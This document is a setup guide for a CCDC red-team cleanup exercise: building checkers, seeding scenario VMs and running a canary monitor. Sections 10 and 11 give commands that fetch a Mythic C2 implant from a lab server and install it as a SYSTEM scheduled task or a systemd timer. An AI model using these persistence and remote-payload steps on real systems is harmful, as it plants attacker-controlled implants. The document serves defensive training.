# CCDC Red Team Artifacts: Installing the Checkers and Canary Monitor

This guide documents how to download, compile, install, and run the CCDC cleanup checkers on Linux and Windows, and how to start the canary monitor used during a practice session.

The commands below install verification and monitoring tools. Scenario images must already be prepared by the exercise organizer. Section 9 documents one optional scheduled-task artifact for an isolated, authorized exercise; deployment of other web shells, unauthorized access keys, and persistence mechanisms is outside this guide.

Keep each scenario image and its matching checker version together when reproducing an exercise.

## 1. Prepare the lab

1. Use disposable Linux and Windows VMs on an isolated exercise network.
2. Take a snapshot before the exercise and record each VM's OS, architecture, and role.
3. Keep the monitor on a separate instructor machine.
4. Obtain the organizer's prepared scenario images and their matching checkers.
5. Preserve scenario state files: they establish which exercise the checker is evaluating.

The repository has separate scenario preparation scripts for Linux, Fedora, and Windows. They change the machine; the `redhavi-check*` scripts evaluate cleanup. Installing a checker alone does not create a scenario.

## 2. Download the source on Linux

On Ubuntu or Debian, install the build tools:

```bash
sudo apt-get update
sudo apt-get install -y git build-essential shc python3
```

On Fedora:

```bash
sudo dnf install -y git gcc make shc python3
```

Fedora distributes `shc` as a package. Package availability on other distributions depends on the configured repositories. See the [Fedora package page](https://packages.fedoraproject.org/pkgs/shc/shc/) and [upstream SHC instructions](https://github.com/neurobin/shc).

Clone into a new working directory:

```bash
git clone https://github.com/4rji/todo.git ccdc-redhavi
cd ccdc-redhavi
cd binarios/redhavi
```

Run the following Linux build commands from this `binarios/redhavi` directory. Build inside a VM matching the target OS and architecture; a macOS executable will not run on Linux.

## 3. Compile and install the Linux checker

Use the SHC-specific source. Its entry point is adapted to run when packaged by SHC.

```bash
bash -n redhavi-check-shc
mkdir -p build
shc -f redhavi-check-shc -o build/redhavi-check
sudo install -d -m 0755 /usr/local/bin
sudo install -m 0755 build/redhavi-check /usr/local/bin/redhavi-check
```

`install` copies the executable and sets its permissions, leaving the build output available for reuse. The destination file is replaced if it already exists.

Run it on the prepared exercise VM:

```bash
sudo /usr/local/bin/redhavi-check
result=$?
printf 'Checker exit code: %s\n' "$result"
```

For Ubuntu, this revision requires `/var/lib/redhavi/state` with a matching, completed scenario marker. The Ubuntu scenario version is `2`, with `9` expected checks. A missing or incompatible marker is an error; do not fabricate a marker to obtain a score.

SHC executables still require the original shell and the commands used by the script. Packaging does not make them fully standalone or provide a security boundary for the source. See the [SHC documentation](https://github.com/neurobin/shc).

If packaging is unnecessary, install the readable script instead. This replaces the same installed command:

```bash
sudo install -m 0755 redhavi-check /usr/local/bin/redhavi-check
```

### Ubuntu 24.04 scenario with monitor check-ins

The Ubuntu 24.04 profile adds a systemd oneshot service and timer that call the
monitor every three minutes. It requires exactly Ubuntu `24.04`. Install the
profile and its shared implementation together:

```bash
bash -n redhavi redhavi-ubuntu24 redhavi-check redhavi-check-ubuntu24
sudo install -m 0755 redhavi redhavi-ubuntu24 \
  redhavi-check redhavi-check-ubuntu24 /usr/local/bin/
```

Start `ccdc-canary-monitor` on the isolated instructor network first, then seed a
disposable Ubuntu 24.04 VM using the monitor address reachable from that VM:

```bash
sudo CANARY_URL=http://MONITOR_IP:8081/checkin \
  /usr/local/bin/redhavi-ubuntu24
```

The default interval is three minutes. Override it when needed with
`CANARY_INTERVAL=N`. The seeder installs `redhavi-canary.service` and
`redhavi-canary.timer`; the dedicated checker treats either unit, or an active
or enabled timer, as remaining persistence:

```bash
sudo /usr/local/bin/redhavi-check-ubuntu24
```

This profile records scenario version `1` and runs `10` scored checks. The
profile scripts source `redhavi` and `redhavi-check` from the same directory,
so deploy each pair together. Do not expose the unauthenticated monitor outside
the isolated exercise network.

## 4. Compile and install the Fedora checker

For the Fedora exercise, use the dedicated Fedora checker. The source filename really is `redhavi-check-federo-shc`; keep that spelling in the build command.

```bash
bash -n redhavi-check-federo-shc
mkdir -p build
shc -f redhavi-check-federo-shc -o build/redhavi-check-fedora
sudo install -d -m 0755 /usr/local/bin
sudo install -m 0755 build/redhavi-check-fedora /usr/local/bin/redhavi-check-fedora
sudo /usr/local/bin/redhavi-check-fedora
result=$?
printf 'Checker exit code: %s\n' "$result"
```

This checker expects Fedora and runs `16` scored checks. Its service checks are informational and do not contribute to the score. It does not enforce the same scenario-state marker as the Ubuntu checker, so confirm the VM's exercise baseline separately.

To install the readable script instead:

```bash
sudo install -m 0755 redhavi-check-fedora /usr/local/bin/redhavi-check-fedora
```

## 5. Copy Linux binaries to another exercise VM

Build separately for each target platform. Replace `student@LAB_VM` with the account and address of your matching exercise VM.

For the Linux checker:

```bash
scp build/redhavi-check student@LAB_VM:~/redhavi-check
```

Then, in a terminal on that VM:

```bash
sudo install -m 0755 ./redhavi-check /usr/local/bin/redhavi-check
sudo /usr/local/bin/redhavi-check
```

For Fedora, transfer `build/redhavi-check-fedora` and install it as `/usr/local/bin/redhavi-check-fedora` instead.

If a compiled file fails on the destination, rebuild on that OS and architecture, or use the readable checker. Keep `/bin/bash` and the checker's system utilities installed.

## 6. Download the Windows files

Use 64-bit Windows PowerShell 5.1 on the Windows build machine. Git is required for these download commands.

```powershell
git clone https://github.com/4rji/todo.git ccdc-redhavi
Set-Location .\ccdc-redhavi
Set-Location .\binarios\redhavi
$PSVersionTable.PSVersion
[Environment]::Is64BitProcess
```

The last command should return `True`. The combined Windows scenario is self-contained in:

- `windows-dos-combined/`
- `redhavi-checkWin-ps2exe.ps1` for the legacy standalone checker build
- `redhavi-apolloWin.ps1` when using the optional Apollo1 exercise artifact

See `windows-dos-combined/README.md` for the short combined workflow. The Apollo1 script is independent and may be run after the main Windows scenario has already been prepared. These scripts use Windows administrative cmdlets, so run them from an elevated terminal on the exercise VM.

## 7. Compile the Windows checker into an EXE

From the downloaded `binarios\redhavi` directory:

```powershell
.\redhavi-checkWin-ps2exe.ps1
```

The wrapper installs PS2EXE for the current user if needed and produces `Red_team_artifacts.exe` in the current directory. It builds an x64 console executable that requests administrator privileges and prints the output's SHA-256 hash.

For an explicit output directory:

```powershell
.\redhavi-checkWin-ps2exe.ps1 `
    -OutputPath .\build\Red_team_artifacts.exe
```

Choose another output path if that exact legacy build already exists.

PS2EXE packages PowerShell 5.1-compatible code into a .NET executable. It does not provide cryptographic source protection. See the [PS2EXE documentation](https://github.com/MScholtes/PS2EXE).

If your organization's policy blocks scripts or module installation, use its approved signing or software distribution process. Packaging the checker is optional; the `.ps1` remains usable directly.

## 8. Install and run the Windows checker

Transfer the executable to the exercise VM using your normal file transfer method. Open Windows PowerShell as Administrator in the folder containing the transferred executable:

```powershell
New-Item -ItemType Directory -Path 'C:\CCDC\Tools' -Force | Out-Null
Copy-Item .\Red_team_artifacts.exe 'C:\CCDC\Tools\Red_team_artifacts.exe'
Get-FileHash 'C:\CCDC\Tools\Red_team_artifacts.exe' -Algorithm SHA256
& 'C:\CCDC\Tools\Red_team_artifacts.exe'
$checkerExit = $LASTEXITCODE
Write-Host "Checker exit code: $checkerExit"
```

Compare the hash with the build machine's output. If you built into `build`, the file to transfer is `build\Red_team_artifacts.exe`.

For the script version, run this from the source directory in an elevated Windows PowerShell terminal:

```powershell
& .\windows-dos-combined\redhavi-checkWin.ps1
$checkerExit = $LASTEXITCODE
Write-Host "Checker exit code: $checkerExit"
```

The default state file is `%ProgramData%\redhavi\state-win.json`. This revision requires scenario version `7`, status `ready`, and `11` expected checks. Keep that file during remediation; it tells the checker which artifacts belong to the exercise.

The Windows checker evaluates accounts, scheduled tasks, registry persistence, the scenario SSH key, file attributes, web content, and optional insecure features. The checker and monitor do not require Apache.

## 9. Install and check the independent DOS Windows scenario

`dos.ps1` prepares the complete Redhavi Windows scenario and then adds `ccdcscoring.exe` with the `Redhavi-ccdcscoring` scheduled task. Its combined checker runs the original 11 Redhavi checks plus 2 DOS checks. Do not evaluate this combined scenario with `Red_team_artifacts.exe`.

Keep the entire `windows-dos-combined` folder together. On the disposable exercise VM, run the seeder from an elevated Windows PowerShell 5.1 terminal:

```powershell
Set-Location .\windows-dos-combined
.\dos.ps1
```

Supply `-ExpectedSha256` with the 64-character SHA-256 distributed by the instructor whenever possible.

A successful combined run requires both `%ProgramData%\redhavi\state-win.json` and `%ProgramData%\redhavi\dos-state-win.json`. The DOS marker uses scenario version `2`, status `ready`, and `13` expected checks. The combined workflow also accepts a Redhavi marker whose status is `incomplete` only when its recorded step is `post-validation`; the checker then reports the actual state of all 13 controls instead of denying the whole score. Preserve both markers while remediating the machine.

Run the readable checker with:

```powershell
& .\dos-checkWin.ps1
$checkerExit = $LASTEXITCODE
Write-Host "Checker exit code: $checkerExit"
```

With all 13 artifacts present, the initial score should be `0%`. If Redhavi reached post-validation with unresolved seed checks, the initial score may already include the corresponding absent or clean artifacts. The seeder's cleanup mode removes only its two additional DOS artifacts:

```powershell
.\dos.ps1 -Remove
.\dos-checkWin.ps1
```

To package the dedicated checker:

```powershell
.\dos-checkWin-ps2exe.ps1
```

This produces `Dos_team_artifacts.exe`. To choose another location or replace an existing build intentionally:

```powershell
.\dos-checkWin-ps2exe.ps1 `
    -OutputPath .\build\Dos_team_artifacts.exe `
    -Force
```

The packager embeds the compatible `redhavi-checkWin.ps1` into the executable. Running the readable `dos-checkWin.ps1` directly requires the compatible original checker beside it.

The short instructions and a complete validated initial result are in `windows-dos-combined/README.md`.

## 10. Install the optional Apollo1 scheduled-task artifact

Use this only on a disposable Windows VM in the isolated exercise network. The helper downloads `apollo1.exe` from the external server IP configured by `-DownloadUrl`, stores it at `C:\ProgramData\redhavi\apollo1.exe`, and creates the visible scheduled task `Redhavi-Apollo1`. The task runs as `SYSTEM` every three minutes. If the previous process is still running, Task Scheduler does not start a duplicate instance.

The repository's `apollo1.exe` and `poseidon.bin` files are zero-byte placeholders created with `touch`; neither is a functional payload. Generate a new Apollo payload in Mythic for each authorized exercise. Copy that new payload to the external lab server and record its SHA-256 hash. An old payload may not connect or function with the active Mythic environment, and it must not be treated as a permanent reusable binary.

On the lab server at `172.16.101.77`, place `apollo1.exe` in a dedicated directory and serve that directory on TCP port `8087`:

```bash
mkdir -p "$HOME/apollo-share"
cp ./apollo1.exe "$HOME/apollo-share/apollo1.exe"
cd "$HOME/apollo-share"
python3 -m http.server 8087 --bind 172.16.101.77
```

Keep that terminal open during installation. Permit port `8087` only on the isolated exercise network.

On the Windows exercise VM, open Windows PowerShell as Administrator in the directory containing `redhavi-apolloWin.ps1` and run:

```powershell
.\redhavi-apolloWin.ps1
```

The default external server URL is `http://172.16.101.77:8087/apollo1.exe`. Supply the URL for the server hosting the newly generated Mythic payload and its interval explicitly when they differ:

```powershell
.\redhavi-apolloWin.ps1 `
    -DownloadUrl 'http://172.16.101.77:8087/apollo1.exe' `
    -IntervalMinutes 3
```

When a trusted SHA-256 value is available, require it during installation:

```powershell
.\redhavi-apolloWin.ps1 -ExpectedSha256 'REPLACE_WITH_64_HEX_CHARACTERS'
```

The task begins automatically about one minute after installation. To launch it immediately for a test and inspect its execution information:

```powershell
Start-ScheduledTask -TaskName 'Redhavi-Apollo1'
Get-ScheduledTask -TaskName 'Redhavi-Apollo1'
Get-ScheduledTaskInfo -TaskName 'Redhavi-Apollo1'
```

`Start-ScheduledTask` requests an immediate run. `Get-ScheduledTask` shows whether the task is ready or running. `Get-ScheduledTaskInfo` reports fields such as `LastRunTime`, `NextRunTime`, `LastTaskResult`, and `NumberOfMissedRuns`; a completed run commonly reports `0` in `LastTaskResult`.

To remove both the scheduled task and the installed executable:

```powershell
.\redhavi-apolloWin.ps1 -Remove
```

This optional artifact does not change the existing `redhaviwin.ps1` state marker. The current `redhavi-checkWin.ps1` checker does not score Apollo1 cleanup.

## 11. Install the optional Poseidon systemd artifact

Use this only on an authorized disposable Linux VM in the isolated exercise network. `redhavi-poseidon` downloads a newly generated Mythic Poseidon payload from the external server configured by `--download-url`, installs it as `/var/lib/redhavi/poseidon.bin`, and creates `redhavi-poseidon.service` and `redhavi-poseidon.timer`.

The repository's `poseidon.bin` is a zero-byte placeholder created with `touch`; it is not installed automatically and cannot run. Generate a fresh Poseidon payload in Mythic for the current exercise, copy it to the external lab server, and record its SHA-256 hash.

On the lab server at `172.16.102.58`, serve the generated file on TCP port `8087`:

```bash
mkdir -p "$HOME/poseidon-share"
cp ./poseidon.bin "$HOME/poseidon-share/poseidon.bin"
cd "$HOME/poseidon-share"
python3 -m http.server 8087 --bind 172.16.102.58
```

On the Linux exercise VM, install the artifact with the trusted hash:

```bash
sudo ./redhavi-poseidon \
  --download-url http://172.16.102.58:8087/poseidon.bin \
  --interval-minutes 3 \
  --expected-sha256 REPLACE_WITH_64_HEX_CHARACTERS
```

The default URL is `http://172.16.102.58:8087/poseidon.bin`, and the default interval is three minutes. The first scheduled attempt occurs about one minute after installation. If the service remains active, systemd does not start a duplicate instance.

Inspect the timer and service with:

```bash
sudo systemctl status redhavi-poseidon.timer
sudo systemctl status redhavi-poseidon.service
sudo systemctl list-timers redhavi-poseidon.timer
sudo journalctl -u redhavi-poseidon.service
```

Remove the timer, service, and installed payload with:

```bash
sudo ./redhavi-poseidon --remove
```

This optional artifact does not change the Linux scenario state marker. The current Linux cleanup checkers do not score Poseidon cleanup.

## 12. Start the canary monitor

The monitor needs Python 3 and uses only the standard library. It does not need compilation or pip packages.

On the Linux instructor machine, from the downloaded `binarios/redhavi` directory:

```bash
sudo install -m 0755 ccdc-canary-monitor /usr/local/bin/ccdc-canary-monitor
mkdir -p "$HOME/ccdc-monitor"
ccdc-canary-monitor \
  --bind 127.0.0.1 \
  --port 8081 \
  --clean-threshold 240 \
  --state "$HOME/ccdc-monitor/state.json"
```

Open `http://127.0.0.1:8081/`. Keep the terminal open; press Ctrl+C to stop the monitor. Start it again with the same state path to retain recorded machines.

For access from exercise VMs, replace `127.0.0.1` with the instructor machine's isolated lab-interface IP and use that IP in the browser and check-in URLs. Permit TCP port `8081` only from the exercise network. This server has no authentication, so keep it within that network.

To run the same monitor on Windows, from its source directory:

```powershell
New-Item -ItemType Directory -Path "$env:USERPROFILE\ccdc-monitor" -Force | Out-Null
py -3 .\ccdc-canary-monitor --bind 127.0.0.1 --port 8081 --clean-threshold 240 --state "$env:USERPROFILE\ccdc-monitor\state.json"
```

This Windows command requires Python 3 and the Python launcher. If your installation exposes only `python`, use that command after confirming `python --version` reports Python 3.

## 13. Test a harmless check-in

Leave the monitor running and open a second terminal on the same machine.

Linux:

```bash
curl --fail --silent --show-error http://127.0.0.1:8081/checkin
curl --fail --silent --show-error http://127.0.0.1:8081/api/status
```

Windows PowerShell:

```powershell
Invoke-RestMethod -Uri 'http://127.0.0.1:8081/checkin' | Out-Null
Invoke-RestMethod -Uri 'http://127.0.0.1:8081/api/status' | ConvertTo-Json -Depth 5
```

These requests fetch the default harmless canary without executing its response. For a remote test, replace the loopback address with the monitor's lab IP after changing its bind address.

After one request, the client should appear red in the status API. With no further requests, it should become green after at least `240` seconds. The dashboard refresh interval adds a small display delay.

The Windows scenario uses a three-minute check-in interval, while the monitor's default threshold is four minutes. A continuing stream of requests therefore normally keeps the client red.

Green means no recent check-in. It can also mean a stopped VM, a network problem, or a manually added machine that has never checked in. Confirm cleanup with the host checker and investigation evidence. Machines behind the same NAT address may appear as a single client.

## 14. Run the exercise and record results

1. Record the initial checker output on each prepared VM.
2. Give students the English investigation handout, `redhavi-task.md`.
3. Have students document findings before making changes.
4. Re-run the matching checker after each remediation group.
5. Check the monitor for continued activity and allow the full idle threshold to pass after the last request.
6. Save the final output, remaining findings, and evidence of service availability.
7. Restore the VM snapshots before the next exercise.

| Exit code | Meaning |
| --- | --- |
| `0` | All checks in the selected rubric passed. |
| `1` | Scored findings remain. |
| `2` | A prerequisite, state validation, or other fatal verification error occurred. |

The Linux and Windows checkers explicitly report infrastructure errors. The Fedora checker has fewer such distinctions; inspect its messages as well as the score. A passing rubric is not a comprehensive guarantee that the system is uncompromised.

## 15. Troubleshooting

| Symptom | What to check |
| --- | --- |
| `shc: command not found` | Confirm SHC is installed on the build VM and available in PATH. |
| Compiled checker does not run | Rebuild on the destination OS and architecture, confirm `/bin/bash` exists, or use the script version. |
| Checker requires root or administrator | Use `sudo` on Linux or an elevated 64-bit Windows PowerShell terminal. |
| Missing, incomplete, or incompatible state | Confirm the organizer supplied the correct prepared image and matching checker revision. |
| PS2EXE module missing | The wrapper installs it automatically for the current user; verify that PowerShell Gallery access and module installation are allowed. |
| Windows build output already exists | Choose a new output path or use `-Force` to intentionally replace that file. |
| Remote monitor connection fails | Confirm the lab-interface bind address, route, firewall, and TCP port `8081`. |
| Dashboard is blank or does not refresh | Query `/api/status` directly and inspect the browser console; do not infer a clean host from an empty dashboard. |
| Monitor is green but checker fails | Investigate the remaining host artifacts; lack of check-ins is only one signal. |

These steps were checked against the source revision above and upstream packaging documentation. The build and installation commands must still be validated on the intended Linux and Windows exercise images.
